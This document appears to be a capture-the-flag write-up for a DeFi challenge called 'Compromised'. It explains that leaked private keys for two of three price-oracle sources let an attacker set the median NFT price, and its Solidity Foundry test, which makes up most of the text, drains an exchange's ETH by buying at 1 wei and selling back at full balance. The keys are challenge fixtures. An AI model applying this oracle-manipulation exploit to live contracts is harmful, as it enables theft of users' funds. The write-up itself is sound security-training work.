# Compromised

## Challenge Overview

The `Exchange` contract sells expensive NFTs for ETH. It relies on a `TrustedOracle` that uses the median price of three trusted sources.

On the exchange's servers, a response seems to contain private keys.

Starting with 0.1 ETH, rescue the ETH in the exchange and send it to the recovery account.

## Vulnerability Analysis

The private keys for two of the price oracle sources. Since the NFT price is the median price of the sources, control of two of the three sources gives total control of the price.

## Exploit Strategy

The exploit is performed by updating the two oracle sources to manipulate the price to 1 wei to buy an NFT and sell it back to the exchange for its ETH balance.

## Proof of Concept

```solidity
function test_compromised() public checkSolved {
    bytes32 source0PrivateKey = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
    address source0 = vm.addr(uint256(source0PrivateKey));
    assertEq(source0, sources[0]);

    bytes32 source1PrivateKey = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
    address source1 = vm.addr(uint256(source1PrivateKey));
    assertEq(source1, sources[1]);

    string memory symbol = symbols[0];
    address[] memory controlledSources = new address[](2);
    controlledSources[0] = source0;
    controlledSources[1] = source1;

    for (uint256 i = 0; i < controlledSources.length; i++) {
        _updateSourcePrices(controlledSources[i], symbol, 0);
    }

    vm.prank(player);
    uint256 tokenId = exchange.buyOne{value: 1 wei}();

    for (uint256 i = 0; i < controlledSources.length; i++) {
        _updateSourcePrices(controlledSources[i], symbol, EXCHANGE_INITIAL_ETH_BALANCE);
    }

    vm.startPrank(player);
    nft.approve(address(exchange), tokenId);
    exchange.sellOne(tokenId);
    vm.stopPrank();

    for (uint256 i = 0; i < controlledSources.length; i++) {
        _updateSourcePrices(controlledSources[i], symbol, INITIAL_NFT_PRICE);
    }

    vm.prank(player);
    payable(recovery).transfer(address(player).balance - PLAYER_INITIAL_ETH_BALANCE);

}

function _updateSourcePrices(address source, string memory symbol, uint256 price) private {
    vm.prank(source);
    oracle.postPrice(symbol, price);
}
```

## Result

ETH in the exchange will be rescued and sent to the recovery account.